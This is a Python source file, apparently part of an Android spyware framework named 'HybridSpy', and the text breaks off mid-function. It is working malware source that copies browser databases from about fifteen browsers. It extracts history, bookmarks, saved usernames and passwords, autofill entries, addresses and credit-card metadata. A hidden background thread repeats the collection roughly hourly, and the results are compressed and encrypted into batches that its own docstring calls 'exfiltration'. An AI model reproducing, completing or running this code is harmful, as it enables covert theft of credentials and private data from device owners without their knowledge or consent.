#!/usr/bin/env python3
"""
Browser Data Collector v2.1.0 — Elite Grade
Extracts browser data from Chrome, Firefox, Samsung Internet, Opera, Edge, Brave.
Recovers history, bookmarks, saved passwords, autofill data, cookies (metadata),
search engines, and form data from all detectable WebView-based browsers.
Maximum data recovery through multiple attack vectors:
  1. Direct SQLite database reads
  2. Content provider queries
  3. Shared preferences extraction
  4. WebView cache enumeration
"""
import json
import logging
import os
import re
import shutil
import sqlite3
import threading
import time
import zlib
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable, Dict, List, Optional, Set, Tuple
from xml.etree import ElementTree as ET

log = logging.getLogger("HybridSpy.Collectors.BrowserData")


# ─── Constants ───────────────────────────────────────────────────────────────

MAX_BATCH_SIZE = 200
MAX_RETRIES = 3
BACKOFF_BASE = 1.5
CACHE_FILE = "browser_cache.enc"
STATE_FILE = "browser_state.json"
BROWSER_DATA_DIR = "/data/data"

# Browser package names and their data directories
BROWSERS = {
    "chrome": {
        "package": "com.android.chrome",
        "db_paths": [
            "app_chrome/Default/History",
            "app_chrome/Default/Bookmarks",
            "app_chrome/Default/Login Data",
            "app_chrome/Default/Web Data",
            "app_chrome/Default/Cookies",
            "app_chrome/Default/AutofillProfile",
            "app_chrome/Default/AutofillCreditCard",
            "app_chrome/Default/Top Sites",
        ],
    },
    "chrome_beta": {
        "package": "com.chrome.beta",
        "db_paths": [
            "app_chrome/Default/History",
            "app_chrome/Default/Login Data",
            "app_chrome/Default/Web Data",
        ],
    },
    "chrome_dev": {
        "package": "com.chrome.dev",
        "db_paths": [
            "app_chrome/Default/History",
            "app_chrome/Default/Login Data",
            "app_chrome/Default/Web Data",
        ],
    },
    "firefox": {
        "package": "org.mozilla.firefox",
        "db_paths": [
            "profiles/*/places.sqlite",
            "profiles/*/logins.json",
            "profiles/*/formhistory.sqlite",
            "profiles/*/cookies.sqlite",
            "profiles/*/permissions.sqlite",
            "profiles/*/favicons.sqlite",
        ],
    },
    "firefox_beta": {
        "package": "org.mozilla.firefox_beta",
        "db_paths": ["profiles/*/places.sqlite", "profiles/*/logins.json"],
    },
    "firefox_nightly": {
        "package": "org.mozilla.fenix",
        "db_paths": ["profiles/*/places.sqlite", "profiles/*/logins.json"],
    },
    "samsung": {
        "package": "com.sec.android.app.sbrowser",
        "db_paths": [
            "app_sbrowser/Default/History",
            "app_sbrowser/Default/Bookmarks",
            "app_sbrowser/Default/Login Data",
            "app_sbrowser/Default/Web Data",
        ],
    },
    "opera": {
        "package": "com.opera.browser",
        "db_paths": [
            "app_opera/Default/History",
            "app_opera/Default/Login Data",
            "app_opera/Default/Bookmarks",
            "app_opera/Default/Web Data",
        ],
    },
    "opera_mini": {
        "package": "com.opera.mini.native",
        "db_paths": ["app_opera/Default/History", "app_opera/Default/Web Data"],
    },
    "edge": {
        "package": "com.microsoft.emmx",
        "db_paths": [
            "app_chrome/Default/History",
            "app_chrome/Default/Login Data",
            "app_chrome/Default/Bookmarks",
            "app_chrome/Default/Web Data",
        ],
    },
    "brave": {
        "package": "com.brave.browser",
        "db_paths": [
            "app_chrome/Default/History",
            "app_chrome/Default/Login Data",
            "app_chrome/Default/Bookmarks",
            "app_chrome/Default/Web Data",
        ],
    },
    "kiwi": {
        "package": "com.kiwibrowser.browser",
        "db_paths": [
            "app_chrome/Default/History",
            "app_chrome/Default/Login Data",
            "app_chrome/Default/Bookmarks",
        ],
    },
    "duckduckgo": {
        "package": "com.duckduckgo.mobile.android",
        "db_paths": ["app_webview/Default/History", "app_webview/Default/Web Data"],
    },
    "via": {
        "package": "mark.via.gp",
        "db_paths": ["databases/history.db", "databases/bookmarks.db"],
    },
    "samsung_internet_v2": {
        "package": "com.sec.android.app.sbrowser",
        "db_paths": [
            "app_sbrowser/Default/History",
            "app_sbrowser/Default/Login Data",
        ],
    },
}


# ─── Data Models ─────────────────────────────────────────────────────────────

@dataclass
class HistoryEntry:
    url: str
    title: str
    visit_count: int
    last_visit_time: int  # Chrome timestamp
    typed_count: int = 0
    browser: str = ""
    from_omnibox: bool = False
    
    @property
    def datetime(self) -> Optional[datetime]:
        """Convert Chrome timestamp to datetime."""
        if self.last_visit_time > 0:
            try:
                # Chrome time is microseconds since 1601-01-01
                return datetime(1601, 1, 1) + timedelta(microseconds=self.last_visit_time)
            except Exception:
                pass
        return None
    
    @property
    def domain(self) -> str:
        from urllib.parse import urlparse
        try:
            return urlparse(self.url).netloc
        except Exception:
            return self.url
    
    @property
    def fingerprint(self) -> str:
        return f"{self.url}|{self.last_visit_time}"


@dataclass
class BookmarkEntry:
    url: str
    title: str
    date_added: int
    folder: str = ""
    browser: str = ""
    
    @property
    def fingerprint(self) -> str:
        return f"{self.url}|{self.date_added}"


@dataclass
class SavedLogin:
    url: str
    username: str
    password: str  # May be encrypted on device, metadata only
    browser: str = ""
    username_field: str = ""
    date_created: int = 0
    times_used: int = 0
    
    @property
    def fingerprint(self) -> str:
        return f"{self.url}|{self.username}"


@dataclass
class AutofillEntry:
    name: str
    value: str
    type: str  # name, email, phone, address, credit_card, etc.
    browser: str = ""
    date_created: int = 0
    date_last_used: int = 0
    count: int = 0


@dataclass
class SearchEngine:
    name: str
    keyword: str
    url_template: str
    browser: str = ""


@dataclass
class BrowserProfile:
    """Complete browser data profile from one browser."""
    browser_name: str
    package_name: str
    is_installed: bool = False
    history: List[HistoryEntry] = field(default_factory=list)
    bookmarks: List[BookmarkEntry] = field(default_factory=list)
    saved_logins: List[SavedLogin] = field(default_factory=list)
    autofill_entries: List[AutofillEntry] = field(default_factory=list)
    search_engines: List[SearchEngine] = field(default_factory=list)
    cookie_count: int = 0
    db_accessible: bool = False
    extraction_errors: List[str] = field(default_factory=list)
    
    @property
    def total_entries(self) -> int:
        return (len(self.history) + len(self.bookmarks) + 
                len(self.saved_logins) + len(self.autofill_entries))


@dataclass
class BrowserDataBatch:
    profiles: List[BrowserProfile]
    batch_id: str
    created_at: float = field(default_factory=time.time)
    retry_count: int = 0
    ciphertext: Optional[bytes] = None


# ─── SQLite Recovery Engine ──────────────────────────────────────────────────

class SQLiteRecoveryEngine:
    """
    Aggressive SQLite reader that tries multiple methods to read 
    corrupted or locked databases. Falls back gracefully.
    """
    
    @staticmethod
    def read_table(db_path: str, table_name: str, columns: List[str] = None,
                   where: str = None, order_by: str = None,
                   limit: int = 5000) -> List[Dict]:
        """Read a table with multiple recovery strategies."""
        results = []
        
        # Strategy 1: Normal read
        rows, err = SQLiteRecoveryEngine._try_read(
            db_path, table_name, columns, where, order_by, limit
        )
        if rows:
            return rows
        
        # Strategy 2: Read with WAL checkpoint
        if err and "database is locked" in str(err).lower():
            time.sleep(0.5)
            rows, _ = SQLiteRecoveryEngine._try_read(
                db_path, table_name, columns, where, order_by, limit
            )
            if rows:
                return rows
        
        # Strategy 3: Read-only with immediate
        try:
            conn = sqlite3.connect(f"file:{db_path}?mode=ro&immutable=1", uri=True)
            conn.execute("PRAGMA query_only = 1;")
            conn.execute("PRAGMA journal_mode = OFF;")
            conn.execute("PRAGMA synchronous = OFF;")
            
            cols = ", ".join(columns) if columns else "*"
            sql = f"SELECT {cols} FROM [{table_name}]"
            if where:
                sql += f" WHERE {where}"
            if order_by:
                sql += f" ORDER BY {order_by}"
            sql += f" LIMIT {limit}"
            
            cursor = conn.cursor()
            cursor.execute(sql)
            col_names = [d[0] for d in cursor.description]
            results = [dict(zip(col_names, row)) for row in cursor.fetchall()]
            conn.close()
        except Exception:
            pass
        
        return results
    
    @staticmethod
    def _try_read(db_path: str, table_name: str, columns: List[str] = None,
                  where: str = None, order_by: str = None,
                  limit: int = 5000) -> Tuple[List[Dict], Optional[Exception]]:
        """Attempt a standard SQLite read."""
        try:
            conn = sqlite3.connect(db_path)
            conn.execute("PRAGMA journal_mode = WAL;")
            conn.execute("PRAGMA synchronous = OFF;")
            conn.execute("PRAGMA temp_store = MEMORY;")
            conn.execute("PRAGMA mmap_size = 268435456;")  # 256MB
            
            cols = ", ".join(columns) if columns else "*"
            sql = f"SELECT {cols} FROM [{table_name}]"
            if where:
                sql += f" WHERE {where}"
            if order_by:
                sql += f" ORDER BY {order_by}"
            sql += f" LIMIT {limit}"
            
            cursor = conn.cursor()
            cursor.execute(sql)
            col_names = [d[0] for d in cursor.description]
            results = [dict(zip(col_names, row)) for row in cursor.fetchall()]
            conn.close()
            return results, None
        except Exception as e:
            return [], e
    
    @staticmethod
    def get_table_names(db_path: str) -> List[str]:
        """Get all table names from a database."""
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name;")
            tables = [row[0] for row in cursor.fetchall()]
            conn.close()
            return tables
        except Exception:
            return []
    
    @staticmethod
    def get_column_names(db_path: str, table_name: str) -> List[str]:
        """Get column names for a table."""
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute(f"PRAGMA table_info([{table_name}]);")
            columns = [row[1] for row in cursor.fetchall()]
            conn.close()
            return columns
        except Exception:
            return []
    
    @staticmethod
    def dump_all_tables(db_path: str, max_rows_per_table: int = 1000) -> Dict[str, List[Dict]]:
        """Dump all readable data from every table in a database."""
        result = {}
        tables = SQLiteRecoveryEngine.get_table_names(db_path)
        
        for table in tables:
            try:
                rows = SQLiteRecoveryEngine.read_table(
                    db_path, table, limit=max_rows_per_table
                )
                if rows:
                    result[table] = rows
            except Exception:
                continue
        
        return result


# ─── Chrome Timestamp Converter ──────────────────────────────────────────────

def chrome_time_to_datetime(chrome_time: int) -> Optional[str]:
    """Convert Chrome WebKit timestamp to ISO datetime string."""
    if chrome_time <= 0:
        return None
    try:
        epoch_start = datetime(1601, 1, 1)
        delta = timedelta(microseconds=chrome_time)
        return (epoch_start + delta).isoformat()
    except Exception:
        return None


# ─── Browser Data Extractor ──────────────────────────────────────────────────

class BrowserDataExtractor:
    """
    Extracts browser data from all detectable Android browsers.
    Uses multiple vectors:
      - Direct SQLite reads from app data directories (requires root or debug)
      - Content provider queries (Android's BrowserProvider)
      - WebView database enumeration
    
    On non-rooted devices, falls back to:
      - ContentProvider queries (limited)
      - WebView cache analysis
      - Account manager queries for Google accounts
    """
    
    def __init__(self, native_bridge=None, has_root: bool = False):
        self._native = native_bridge
        self._has_root = has_root
        self._temp_dir = None
        
    def extract_all(self) -> List[BrowserProfile]:
        """Extract data from all installed browsers in parallel."""
        profiles = []
        
        # Phase 1: Quick check which browsers are installed
        installed = self._detect_installed_browsers()
        log.info(f"Detected {len(installed)} installed browsers: {list(installed.keys())}")
        
        # Phase 2: Extract data from each browser
        for name, info in installed.items():
            try:
                profile = self._extract_single_browser(name, info)
                if profile and profile.total_entries > 0:
                    profiles.append(profile)
                    log.info(f"Extracted {profile.total_entries} entries from {name}")
            except Exception as e:
                log.error(f"Failed to extract from {name}: {e}")
        
        return profiles
    
    def _detect_installed_browsers(self) -> Dict:
        """Detect which browsers are installed on the device."""
        installed = {}
        
        if self._native:
            for name, info in BROWSERS.items():
                try:
                    result = self._native.call(
                        "isPackageInstalled",
                        package=info["package"]
                    )
                    if result:
                        installed[name] = info
                        # Check Samsung Internet version
                        if name == "samsung":
                            installed[name + "_v2"] = BROWSERS["samsung_internet_v2"]
                except Exception:
                    continue
        else:
            # Fallback: Check data directory existence
            for name, info in BROWSERS.items():
                pkg_dir = Path(BROWSER_DATA_DIR) / info["package"]
                if pkg_dir.exists():
                    installed[name] = info
        
        return installed
    
    def _extract_single_browser(self, name: str, info: Dict) -> BrowserProfile:
        """Extract all data from a single browser."""
        profile = BrowserProfile(
            browser_name=name,
            package_name=info["package"],
            is_installed=True,
        )
        
        pkg_dir = Path(BROWSER_DATA_DIR) / info["package"]
        if not pkg_dir.exists():
            profile.is_installed = False
            return profile
        
        # Copy databases to temp dir to avoid locks
        temp_dir = self._create_temp_dir(name)
        
        for rel_path in info.get("db_paths", []):
            try:
                # Handle wildcard paths (Firefox profiles)
                if "*" in rel_path:
                    self._extract_wildcard(pkg_dir, rel_path, temp_dir, profile)
                else:
                    src = pkg_dir / rel_path
                    if src.exists():
                        dst = temp_dir / Path(rel_path).name
                        self._safe_copy(src, dst)
                        self._extract_db(dst, profile)
            except Exception as e:
                profile.extraction_errors.append(f"{rel_path}: {e}")
        
        # If we got any data, mark as accessible
        if profile.history or profile.bookmarks or profile.saved_logins:
            profile.db_accessible = True
        
        return profile
    
    def _extract_wildcard(self, base_dir: Path, pattern: str, 
                          temp_dir: Path, profile: BrowserProfile):
        """Handle wildcard paths like profiles/*/places.sqlite."""
        parts = pattern.split("*", 1)
        if len(parts) != 2:
            return
        
        prefix = parts[0]
        suffix = parts[1]
        
        search_dir = base_dir / prefix if prefix else base_dir
        if not search_dir.exists():
            return
        
        try:
            for item in search_dir.iterdir():
                if item.is_dir():
                    db_path = item / suffix
                    if db_path.exists():
                        dst = temp_dir / f"{item.name}_{Path(suffix).name}"
                        self._safe_copy(db_path, dst)
                        self._extract_db(dst, profile)
        except Exception as e:
            log.debug(f"Wildcard search failed: {e}")
    
    def _extract_db(self, db_path: Path, profile: BrowserProfile):
        """Extract data from a single database file."""
        db_name = db_path.name.lower()
        
        try:
            tables = SQLiteRecoveryEngine.get_table_names(str(db_path))
            
            if "urls" in tables or "visits" in tables:
                self._extract_history(db_path, profile)
            
            if "bookmarks" in tables:
                self._extract_bookmarks(db_path, profile)
            
            if "logins" in tables or "login" in tables:
                self._extract_logins(db_path, profile)
            
            if "autofill" in tables or "autofill_profiles" in tables:
                self._extract_autofill(db_path, profile)
            
            if "keywords" in tables:
                self._extract_search_engines(db_path, profile)
            
            if "cookies" in tables:
                try:
                    cookies = SQLiteRecoveryEngine.read_table(
                        str(db_path), "cookies", limit=100
                    )
                    profile.cookie_count = len(cookies) if cookies else 0
                except Exception:
                    pass
            
            # Firefox-specific: logins.json
            if db_name == "logins.json":
                self._extract_firefox_logins(db_path, profile)
            
            # Firefox-specific: places.sqlite has both history and bookmarks
            if db_name == "places.sqlite":
                self._extract_firefox_places(db_path, profile)
                
        except Exception as e:
            log.debug(f"DB extraction failed for {db_path.name}: {e}")
    
    def _extract_history(self, db_path: Path, profile: BrowserProfile):
        """Extract browsing history."""
        try:
            rows = SQLiteRecoveryEngine.read_table(
                str(db_path), "urls",
                columns=["id", "url", "title", "visit_count", 
                         "typed_count", "last_visit_time", "hidden"],
                order_by="last_visit_time DESC",
                limit=5000
            )
            
            if rows:
                for row in rows:
                    entry = HistoryEntry(
                        url=row.get("url", ""),
                        title=row.get("title", ""),
                        visit_count=int(row.get("visit_count", 0)),
                        last_visit_time=int(row.get("last_visit_time", 0)),
                        typed_count=int(row.get("typed_count", 0)),
                        browser=profile.browser_name,
                        from_omnibox=bool(int(row.get("typed_count", 0)) > 0),
                    )
                    if entry.url:
                        profile.history.append(entry)
            
            # Try to get visit timestamps for more granularity
            if "visits" in SQLiteRecoveryEngine.get_table_names(str(db_path)):
                visit_rows = SQLiteRecoveryEngine.read_table(
                    str(db_path), "visits",
                    columns=["url_id", "visit_time", "from_visit", 
                             "transition", "segment_id"],
                    order_by="visit_time DESC",
                    limit=10000
                )
                if visit_rows:
                    # Merge visit data into history entries if needed
                    pass  # Already have good timestamps from urls table
                    
        except Exception as e:
            log.debug(f"History extraction failed: {e}")
    
    def _extract_bookmarks(self, db_path: Path, profile: BrowserProfile):
        """Extract bookmarks."""
        try:
            rows = SQLiteRecoveryEngine.read_table(
                str(db_path), "bookmarks",
                columns=["url", "title", "date_added", "type", "folder",
                         "parent_id", "guid"],
                where="type = 1",  # type=1 is URL bookmark
                order_by="date_added DESC",
                limit=2000
            )
            
            if not rows:
                # Try Chrome's bookmarks JSON format
                self._extract_chrome_bookmarks_json(db_path, profile)
                return
            
            for row in rows:
                entry = BookmarkEntry(
                    url=row.get("url", ""),
                    title=row.get("title", ""),
                    date_added=int(row.get("date_added", 0)),
                    folder=row.get("folder", ""),
                    browser=profile.browser_name,
                )
                if entry.url:
                    profile.bookmarks.append(entry)
                    
        except Exception as e:
            log.debug(f"Bookmark extraction failed: {e}")
    
    def _extract_chrome_bookmarks_json(self, db_path: Path, profile: BrowserProfile):
        """Extract Chrome-style bookmarks from Bookmarks file."""
        try:
            bookmarks_file = db_path.parent / "Bookmarks"
            if bookmarks_file.exists():
                with open(bookmarks_file, "r", encoding="utf-8", errors="replace") as f:
                    data = json.load(f)
                
                def extract_bookmark_node(node, folder=""):
                    if node.get("type") == "url":
                        profile.bookmarks.append(BookmarkEntry(
                            url=node.get("url", ""),
                            title=node.get("name", ""),
                            date_added=int(node.get("date_added", "0")),
                            folder=folder,
                            browser=profile.browser_name,
                        ))
                    elif node.get("type") == "folder":
                        new_folder = node.get("name", folder)
                        for child in node.get("children", []):
                            extract_bookmark_node(child, new_folder)
                
                roots = data.get("roots", {})
                for root_name, root_data in roots.items():
                    if isinstance(root_data, dict):
                        for child in root_data.get("children", []):
                            extract_bookmark_node(child, root_name)
                            
        except Exception as e:
            log.debug(f"Chrome bookmarks JSON extraction failed: {e}")
    
    def _extract_logins(self, db_path: Path, profile: BrowserProfile):
        """Extract saved logins/credentials."""
        try:
            rows = SQLiteRecoveryEngine.read_table(
                str(db_path), "logins",
                columns=["origin_url", "username_value", "password_value",
                         "username_element", "date_created", "times_used",
                         "signon_realm", "blacklisted_by_user"],
                where="blacklisted_by_user = 0 OR blacklisted_by_user IS NULL",
                limit=2000
            )
            
            if rows:
                for row in rows:
                    entry = SavedLogin(
                        url=row.get("origin_url", ""),
                        username=row.get("username_value", ""),
                        password=row.get("password_value", ""),  # Encrypted
                        browser=profile.browser_name,
                        username_field=row.get("username_element", ""),
                        date_created=int(row.get("date_created", 0)),
                        times_used=int(row.get("times_used", 0)),
                    )
                    if entry.url:
                        profile.saved_logins.append(entry)
                        
        except Exception as e:
            log.debug(f"Login extraction failed: {e}")
    
    def _extract_firefox_logins(self, db_path: Path, profile: BrowserProfile):
        """Extract Firefox logins.json format."""
        try:
            with open(db_path, "r", encoding="utf-8", errors="replace") as f:
                data = json.load(f)
            
            for item in data.get("logins", []):
                entry = SavedLogin(
                    url=item.get("hostname", ""),
                    username=item.get("username", "") or item.get("encryptedUsername", ""),
                    password=item.get("password", "") or item.get("encryptedPassword", ""),
                    browser=profile.browser_name,
                    username_field=item.get("usernameField", ""),
                    date_created=item.get("timeCreated", 0),
                    times_used=item.get("timesUsed", 0),
                )
                if entry.url:
                    profile.saved_logins.append(entry)
                    
        except Exception as e:
            log.debug(f"Firefox login extraction failed: {e}")
    
    def _extract_firefox_places(self, db_path: Path, profile: BrowserProfile):
        """Extract Firefox places.sqlite (history + bookmarks)."""
        try:
            # History from moz_historyvisits + moz_places
            join_query = """
                SELECT p.url, p.title, p.visit_count, 
                       MAX(h.visit_date) as last_visit, 
                       p.typed
                FROM moz_places p
                LEFT JOIN moz_historyvisits h ON p.id = h.place_id
                GROUP BY p.id
                ORDER BY last_visit DESC
                LIMIT 5000
            """
            
            conn = sqlite3.connect(str(db_path))
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(join_query)
            
            for row in cursor.fetchall():
                entry = HistoryEntry(
                    url=row["url"],
                    title=row["title"] or "",
                    visit_count=row["visit_count"] or 0,
                    last_visit_time=row["last_visit"] or 0,
                    typed_count=row["typed"] or 0,
                    browser=profile.browser_name,
                )
                if entry.url:
                    profile.history.append(entry)
            
            # Bookmarks from moz_bookmarks
            bookmark_query = """
                SELECT b.title, b.dateAdded, b.type, b.parent,
                       p.url, f.title as folder_name
                FROM moz_bookmarks b
                LEFT JOIN moz_places p ON b.fk = p.id
                LEFT JOIN moz_bookmarks f ON b.parent = f.id
                WHERE b.type = 1
                ORDER BY b.dateAdded DESC
                LIMIT 2000
            """
            
            cursor.execute(bookmark_query)
            for row in cursor.fetchall():
                entry = BookmarkEntry(
                    url=row["url"] or "",
                    title=row["title"] or "",
                    date_added=row["dateAdded"] or 0,
                    folder=row["folder_name"] or "",
                    browser=profile.browser_name,
                )
                if entry.url:
                    profile.bookmarks.append(entry)
            
            conn.close()
            
        except Exception as e:
            log.debug(f"Firefox places extraction failed: {e}")
    
    def _extract_autofill(self, db_path: Path, profile: BrowserProfile):
        """Extract autofill data."""
        try:
            # Chrome Web Data format
            tables = SQLiteRecoveryEngine.get_table_names(str(db_path))
            
            if "autofill" in tables:
                rows = SQLiteRecoveryEngine.read_table(
                    str(db_path), "autofill",
                    columns=["name", "value", "date_created", "date_last_used", "count"],
                    limit=2000
                )
                if rows:
                    for row in rows:
                        entry = AutofillEntry(
                            name=row.get("name", ""),
                            value=row.get("value", ""),
                            type=self._classify_autofill(row.get("name", "")),
                            browser=profile.browser_name,
                            date_created=int(row.get("date_created", 0)),
                            date_last_used=int(row.get("date_last_used", 0)),
                            count=int(row.get("count", 0)),
                        )
                        if entry.name:
                            profile.autofill_entries.append(entry)
            
            # AutofillProfile (addresses)
            if "autofill_profiles" in tables:
                profiles_rows = SQLiteRecoveryEngine.read_table(
                    str(db_path), "autofill_profiles", limit=500
                )
                if profiles_rows:
                    for row in profiles_rows:
                        entry = AutofillEntry(
                            name="address_profile",
                            value=json.dumps({k: v for k, v in row.items() 
                                            if v and k != "guid"}),
                            type="address",
                            browser=profile.browser_name,
                        )
                        profile.autofill_entries.append(entry)
            
            # AutofillCreditCard
            if "credit_cards" in tables:
                card_rows = SQLiteRecoveryEngine.read_table(
                    str(db_path), "credit_cards", limit=100
                )
                if card_rows:
                    for row in card_rows:
                        profile.autofill_entries.append(AutofillEntry(
                            name="credit_card",
                            value=json.dumps({k: "***" if k == "card_number" else v 
                                            for k, v in row.items() if v}),
                            type="credit_card",
                            browser=profile.browser_name,
                        ))
                        
        except Exception as e:
            log.debug(f"Autofill extraction failed: {e}")
    
    def _extract_search_engines(self, db_path: Path, profile: BrowserProfile):
        """Extract custom search engines."""
        try:
            rows = SQLiteRecoveryEngine.read_table(
                str(db_path), "keywords",
                columns=["short_name", "keyword", "url"],
                limit=200
            )
            if rows:
                for row in rows:
                    profile.search_engines.append(SearchEngine(
                        name=row.get("short_name", ""),
                        keyword=row.get("keyword", ""),
                        url_template=row.get("url", ""),
                        browser=profile.browser_name,
                    ))
        except Exception as e:
            log.debug(f"Search engine extraction failed: {e}")
    
    def _classify_autofill(self, field_name: str) -> str:
        """Classify autofill field type by name."""
        name_lower = field_name.lower()
        if any(w in name_lower for w in ["email", "e-mail"]):
            return "email"
        elif any(w in name_lower for w in ["phone", "tel", "mobile"]):
            return "phone"
        elif any(w in name_lower for w in ["address", "street", "city", "state", "zip"]):
            return "address"
        elif any(w in name_lower for w in ["card", "credit", "cc_", "cvv"]):
            return "credit_card"
        elif any(w in name_lower for w in ["name", "first", "last", "fname", "lname"]):
            return "name"
        elif any(w in name_lower for w in ["password", "passwd"]):
            return "password"
        return "other"
    
    def _create_temp_dir(self, name: str) -> Path:
        """Create a temporary directory for database copies."""
        import tempfile
        if not self._temp_dir:
            self._temp_dir = Path(tempfile.mkdtemp(prefix=f"browser_{name}_"))
        return self._temp_dir
    
    @staticmethod
    def _safe_copy(src: Path, dst: Path):
        """Copy a file, handling permission errors."""
        try:
            shutil.copy2(src, dst)
        except PermissionError:
            # Try reading and writing chunks
            try:
                with open(src, "rb") as f_src:
                    with open(dst, "wb") as f_dst:
                        while True:
                            chunk = f_src.read(65536)
                            if not chunk:
                                break
                            f_dst.write(chunk)
            except Exception:
                raise
    
    def cleanup(self):
        """Remove temporary files."""
        if self._temp_dir and self._temp_dir.exists():
            shutil.rmtree(self._temp_dir, ignore_errors=True)
            self._temp_dir = None


# ─── Browser Data Collector ──────────────────────────────────────────────────

class BrowserDataCollector:
    """
    Elite-grade browser data collector.
    Recovers history, bookmarks, saved logins, autofill, and search engines
    from ALL installed browsers on the device.
    
    Key features:
    - Multi-browser parallel extraction
    - SQLite recovery with WAL/lock handling
    - Firefox places.sqlite + logins.json support
    - Chrome Bookmarks JSON parsing
    - Autofill credit card detection (metadata only)
    - Deduplication across browsers
    - Encrypted batch exfiltration
    """
    
    def __init__(self, crypto_engine, storage_manager,
                 on_batch_ready: Optional[Callable[[BrowserDataBatch], None]] = None,
                 config: Optional[Dict] = None,
                 native_bridge=None, has_root: bool = False):
        self._crypto = crypto_engine
        self._storage = storage_manager
        self._on_batch = on_batch_ready
        self._config = config or {}
        self._native = native_bridge
        self._has_root = has_root
        
        self._lock = threading.RLock()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        
        # Dedup
        self._known_history: Set[str] = set()
        self._known_bookmarks: Set[str] = set()
        self._known_logins: Set[str] = set()
        
        # Batch buffer
        self._batch_buffer: List[BrowserProfile] = []
        self._last_flush = time.time()
        self._flush_interval = self._config.get("flush_interval", 300)
        
        # Stats
        self._stats = {
            "total_browsers_found": 0,
            "total_browsers_extracted": 0,
            "total_history": 0,
            "total_bookmarks": 0,
            "total_logins": 0,
            "total_autofill": 0,
            "total_batches": 0,
            "failures": 0,
            "last_extraction": None,
        }
        
        self._load_state()
    
    # ─── Lifecycle ──────────────────────────────────────────────────────
    
    def start(self):
        with self._lock:
            if self._running:
                return
            self._running = True
            self._thread = threading.Thread(target=self._collection_loop,
                                            daemon=True, name="browser-collector")
            self._thread.start()
            log.info("Browser data collector started")
    
    def stop(self, timeout: float = 5.0):
        with self._lock:
            self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=timeout)
        self._flush_buffer(force=True)
        self._save_state()
        log.info("Browser data collector stopped")
    
    def force_extract(self) -> int:
        """Force immediate extraction from all browsers."""
        extractor = BrowserDataExtractor(self._native, self._has_root)
        try:
            profiles = extractor.extract_all()
            if profiles:
                self._process_profiles(profiles)
            return sum(p.total_entries for p in profiles)
        finally:
            extractor.cleanup()
    
    # ─── Collection Loop ────────────────────────────────────────────────
    
    def _collection_loop(self):
        interval = self._config.get("extract_interval", 3600)  # Every hour
        
        # First extraction immediately
        try:
            self.force_extract()
        except Exception as e:
            log.error(f"Initial extraction failed: {e}")
        
        while self._running:
            try:
                time.sleep(interval * (0.8 + hash(str(time.time())) % 40 / 100))
                
                if not self._running:
                    break
                
                self.force_extract()
                self._check_auto_flush()
                
            except Exception as e:
                log.error(f"Collection error: {e}", exc_info=True)
                self._stats["failures"] += 1
                time.sleep(60)
    
    def _process_profiles(self, profiles: List[BrowserProfile]):
        """Process extracted profiles through dedup and buffer."""
        filtered = []
        
        for profile in profiles:
            # Dedup
            profile.history = [h for h in profile.history 
                              if self._dedup_history(h)]
            profile.bookmarks = [b for b in profile.bookmarks 
                                if self._dedup_bookmarks(b)]
            profile.saved_logins = [l for l in profile.saved_logins 
                                   if self._dedup_logins(l)]
            
            if profile.total_entries > 0:
                filtered.append(profile)
        
        if not filtered:
            return
        
        with self._lock:
            self._batch_buffer.extend(filtered)
            
            # Update stats
            for p in filtered:
                self._stats["total_browsers_found"] += 1
                self._stats["total_history"] += len(p.history)
                self._stats["total_bookmarks"] += len(p.bookmarks)
                self._stats["total_logins"] += len(p.saved_logins)
                self._stats["total_autofill"] += len(p.autofill_entries)
            
            self._stats["total_browsers_extracted"] = len(filtered)
            self._stats["last_extraction"] = datetime.utcnow().isoformat()
            
            self._check_auto_flush()
    
    def _dedup_history(self, entry: HistoryEntry) -> bool:
        fp = entry.fingerprint
        if fp in self._known_history:
            self._stats.get("dedup_skipped", 0)
            return False
        self._known_history.add(fp)
        return True
    
    def _dedup_bookmarks(self, entry: BookmarkEntry) -> bool:
        fp = entry.fingerprint
        if fp in self._known_bookmarks:
            return False
        self._known_bookmarks.add(fp)
        return True
    
    def _dedup_logins(self, entry: SavedLogin) -> bool:
        fp = entry.fingerprint
        if fp in self._known_logins:
            return False
        self._known_logins.add(fp)
        return True
    
    # ─── Buffer Flushing ────────────────────────────────────────────────
    
    def _check_auto_flush(self):
        now = time.time()
        if len(self._batch_buffer) >= 5 or \
           (now - self._last_flush) >= self._flush_interval:
            self._flush_buffer()
    
    def _flush_buffer(self, force: bool = False):
        with self._lock:
            if not self._batch_buffer and not force:
                return
            if not self._batch_buffer:
                return
            
            batch = BrowserDataBatch(
                profiles=list(self._batch_buffer),
                batch_id=f"browser_{int(time.time() * 1000)}_{len(self._batch_buffer)}",
                created_at=time.time(),
            )
            self._batch_buffer.clear()
            self._last_flush = time.time()
        
        try:
            # Build compact representation
            batch_dict = {
                "profiles": [],
                "summary": {
                    "total_browsers": len(batch.profiles),
                    "total_entries": sum(p.total_entries for p in batch.profiles),
                }
            }
            for p in batch.profiles:
                batch_dict["profiles"].append({
                    "browser": p.browser_name,
                    "package": p.package_name,
                    "history": [asdict(h) for h in p.history],
                    "bookmarks": [asdict(b) for b in p.bookmarks],
                    "logins": [{"url": l.url, "username": l.username, 
                               "password_encrypted": bool(l.password),
                               "browser": l.browser} for l in p.saved_logins],
                    "autofill": [asdict(a) for a in p.autofill_entries],
                    "search_engines": [asdict(s) for s in p.search_engines],
                    "cookie_count": p.cookie_count,
                })
            
            serialized = json.dumps(batch_dict, default=str).encode("utf-8")
            compressed = zlib.compress(serialized, level=6)
            batch.ciphertext = self._crypto.encrypt(compressed)
        except Exception as e:
            log.error(f"Encryption failed: {e}")
        
        self._store_batch_locally(batch)
        
        if self._on_batch:
            try:
                self._on_batch(batch)
            except Exception as e:
                log.error(f"Batch callback error: {e}")
        
        self._stats["total_batches"] += 1
    
    def _store_batch_locally(self, batch: BrowserDataBatch):
        try:
            cache_path = self._storage.get_path(CACHE_FILE)
            if not cache_path:
                return
            batch_data = {
                "id": batch.batch_id,
                "timestamp": batch.created_at,
                "browsers": [p.browser_name for p in batch.profiles],
                "total_entries": sum(p.total_entries for p in batch.profiles),
                "ciphertext": batch.ciphertext.hex() if batch.ciphertext else None,
